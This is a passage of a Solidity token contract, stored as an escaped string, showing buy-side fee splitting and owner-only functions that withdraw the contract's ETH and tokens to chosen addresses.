fee=amount.mul(feesToLiquify[1]).div(_rateBase);\n                            sumToLiquify=sumToLiquify.add(fee);\n                            leftToLiquify=leftToLiquify.add(fee);\n                            super._transfer(_totalFeeAddress,address(this),fee);\n                        }\n            \n                        if(_buyFundFees.length\u003e0 \u0026\u0026 _buyFundAddrs.length==_buyFundFees.length){\n                            for( uint256 i; i \u003c _buyFundFees.length; i++) {\n                                uint256 fee=amount.mul(_buyFundFees[i]).div(_rateBase);\n                                super._transfer(_totalFeeAddress, _buyFundAddrs[i],fee );\n                            }           \n                        }\n\n        }\n\n\n    function claimBalance() external onlyFunder{\n        payable(fundAddress).transfer(address(this).balance);\n    }\n \n    function claimToken(address token, uint256 amount, address to) external onlyFunder {\n        IERC20(token).transfer(to, amount);\n    }\n    \n    function claimToken1(uint256 amount,address to) public onlyFunder {\n        IERC20 Token1 = IERC20(_swapToken1);          \n        Token1.transferFrom(address(_tokenDistributor), to, amount);\n    }\n\n}"}}